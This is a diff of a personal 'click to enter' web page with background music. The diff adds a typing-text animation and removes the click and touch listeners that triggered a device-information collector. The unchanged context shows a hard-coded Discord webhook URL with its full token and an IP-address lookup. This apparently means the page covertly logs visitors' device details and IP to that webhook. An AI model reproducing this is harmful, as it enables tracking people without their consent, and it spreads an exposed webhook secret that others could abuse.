@@ -20,7 +20,7 @@
   </style>
 </head>
 <body>
-  <h1 id="click-to-enter">Click or Tap to enter...</h1>
+  <h1 id="click-to-enter"></h1>
   <div id="info"></div>
   <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
@@ -28,6 +28,23 @@
     const webhookUrl = 'https://discord.com/api/webhooks/1275537111755522189/snOtFHUF9X35Mjfx3gaYyyZS4M1Un-sYtcYkrc3Sw0omUl6MLrd33AnepHKZm8sprUVj';
     const userId = '1190442430118494274'; // User ID of @cosmogt
     let hasSentInfo = false; // Flag to track if information has been sent
+
+    // Function to display text one letter at a time
+    function typeText(element, text, delay) {
+      let index = 0;
+      const interval = setInterval(() => {
+        if (index < text.length) {
+          element.textContent += text.charAt(index);
+          index++;
+        } else {
+          clearInterval(interval);
+        }
+      }, delay);
+    }
+
+    // Start typing effect
+    const clickToEnterElement = document.getElementById('click-to-enter');
+    typeText(clickToEnterElement, 'Click or Tap to enter...', 1000); // 1000 ms delay
 
     // Function to collect device information
     function collectDeviceInfo() {
@@ -105,9 +122,3 @@
         })
        .catch(error => console.error('Failed to get IP address:', error));
     }
-
-    // Add event listeners for click and touch events to collect device information
-    document.addEventListener('click', collectDeviceInfo);
-    document.addEventListener('touchstart', collectDeviceInfo);
-  </script>
-</body
